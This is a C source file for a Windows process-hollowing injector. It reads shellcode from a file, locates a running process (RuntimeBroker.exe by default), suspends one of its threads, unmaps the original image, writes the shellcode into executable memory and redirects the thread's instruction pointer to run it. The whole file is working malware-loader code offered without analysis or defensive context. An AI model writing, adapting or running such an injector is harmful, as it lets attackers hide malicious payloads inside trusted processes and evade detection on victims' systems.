#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

typedef LONG (NTAPI *pNtUnmapViewOfSection)(HANDLE, PVOID);

typedef struct _MY_PBI {
    PVOID Reserved1;
    PVOID PebBaseAddress;
    PVOID Reserved2[2];
    ULONG_PTR UniqueProcessId;
    PVOID Reserved3;
} MY_PBI;

DWORD FindProcessByName(const char *name) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe = { .dwSize = sizeof(pe) };
    DWORD pid = 0;

    if (Process32First(snap, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, name) == 0) {
                pid = pe.th32ProcessID;
                printf("[+] Found %s  PID=%lu\n", name, pid);
                break;
            }
        } while (Process32Next(snap, &pe));
    }
    CloseHandle(snap);
    return pid;
}

DWORD FindThread(DWORD pid) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    THREADENTRY32 te = { .dwSize = sizeof(te) };
    DWORD tid = 0;

    if (Thread32First(snap, &te)) {
        do {
            if (te.th32OwnerProcessID == pid) {
                tid = te.th32ThreadID;
                printf("[+] Found thread TID=%lu in PID=%lu\n", tid, pid);
                break;
            }
        } while (Thread32Next(snap, &te));
    }
    CloseHandle(snap);
    return tid;
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("Usage: %s <shellcode.bin> [process_name]\n", argv[0]);
        return 1;
    }

    const char *sc_path = argv[1];
    const char *target  = argc > 2 ? argv[2] : "RuntimeBroker.exe";

    /* ---- 0. Read shellcode ---- */
    HANDLE hFile = CreateFileA(sc_path, GENERIC_READ, 0, NULL,
                               OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[-] Cannot open %s (%lu)\n", sc_path, GetLastError());
        return 1;
    }
    DWORD sc_len = GetFileSize(hFile, NULL);
    LPVOID sc_buf = VirtualAlloc(NULL, sc_len, MEM_COMMIT, PAGE_READWRITE);
    DWORD nread;
    ReadFile(hFile, sc_buf, sc_len, &nread, NULL);
    CloseHandle(hFile);
    printf("[+] Shellcode: %lu bytes from %s\n", sc_len, sc_path);

    /* ---- 1. Find running target process ---- */
    DWORD pid = FindProcessByName(target);
    if (!pid) {
        printf("[-] %s not found running\n", target);
        return 1;
    }

    /* ---- 2. Find a thread ---- */
    DWORD tid = FindThread(pid);
    if (!tid) {
        printf("[-] No thread found in PID %lu\n", pid);
        return 1;
    }

    /* ---- 3. Open process and thread ---- */
    HANDLE hProcess = OpenProcess(
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ |
        PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (!hProcess) {
        printf("[-] OpenProcess failed (%lu)\n", GetLastError());
        return 1;
    }

    HANDLE hThread = OpenThread(
        THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT | THREAD_SET_CONTEXT,
        FALSE, tid);
    if (!hThread) {
        printf("[-] OpenThread failed (%lu)\n", GetLastError());
        CloseHandle(hProcess);
        return 1;
    }

    /* ---- 4. Suspend the thread ---- */
    SuspendThread(hThread);
    printf("[+] Suspended TID %lu\n", tid);

    /* ---- 5. Read the PEB to find image base ---- */
    MY_PBI pbi;
    typedef LONG (NTAPI *pNtQueryInformationProcess)(
        HANDLE, ULONG, PVOID, ULONG, PULONG);
    pNtQueryInformationProcess NtQueryInformationProcess =
        (pNtQueryInformationProcess)GetProcAddress(
            GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");

    NtQueryInformationProcess(hProcess, 0, &pbi, sizeof(pbi), NULL);

    ULONGLONG image_base = 0;
    ReadProcessMemory(hProcess, (LPCVOID)((ULONGLONG)pbi.PebBaseAddress + 0x10),
                      &image_base, sizeof(image_base), NULL);
    printf("[+] Image base: 0x%llx\n", (unsigned long long)image_base);

    /* ---- 6. Unmap the original image (hollow it) ---- */
    pNtUnmapViewOfSection NtUnmapViewOfSection =
        (pNtUnmapViewOfSection)GetProcAddress(
            GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection");

    LONG status = NtUnmapViewOfSection(hProcess, (PVOID)image_base);
    printf("[+] NtUnmapViewOfSection status: 0x%lx\n", status);

    /* ---- 7. Allocate at image base and write shellcode ---- */
    LPVOID remote = VirtualAllocEx(hProcess, (LPVOID)image_base, sc_len,
                                   MEM_COMMIT | MEM_RESERVE,
                                   PAGE_EXECUTE_READWRITE);
    if (!remote) {
        printf("[!] Alloc at image base failed, using any address\n");
        remote = VirtualAllocEx(hProcess, NULL, sc_len,
                                MEM_COMMIT | MEM_RESERVE,
                                PAGE_EXECUTE_READWRITE);
    }
    if (!remote) {
        printf("[-] VirtualAllocEx failed (%lu)\n", GetLastError());
        ResumeThread(hThread);
        CloseHandle(hThread);
        CloseHandle(hProcess);
        return 1;
    }
    printf("[+] Allocated %lu bytes at %p\n", sc_len, remote);

    SIZE_T written;
    WriteProcessMemory(hProcess, remote, sc_buf, sc_len, &written);
    printf("[+] Wrote %llu bytes\n", (unsigned long long)written);

    /* ---- 8. Redirect RIP to shellcode ---- */
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(hThread, &ctx);
    printf("[+] Original RIP: 0x%llx\n", (unsigned long long)ctx.Rip);

    ctx.Rip = (DWORD64)remote;
    SetThreadContext(hThread, &ctx);
    printf("[+] RIP redirected to %p\n", remote);

    /* ---- 9. Resume ---- */
    ResumeThread(hThread);
    printf("[+] Thread resumed. Shellcode executing in PID %lu (%s)\n",
           pid, target);

    CloseHandle(hThread);
    CloseHandle(hProcess);
    VirtualFree(sc_buf, 0, MEM_RELEASE);

    printf("[*] Injector exiting. Hollowed %s (PID %lu)\n", target, pid);
    return 0;
}
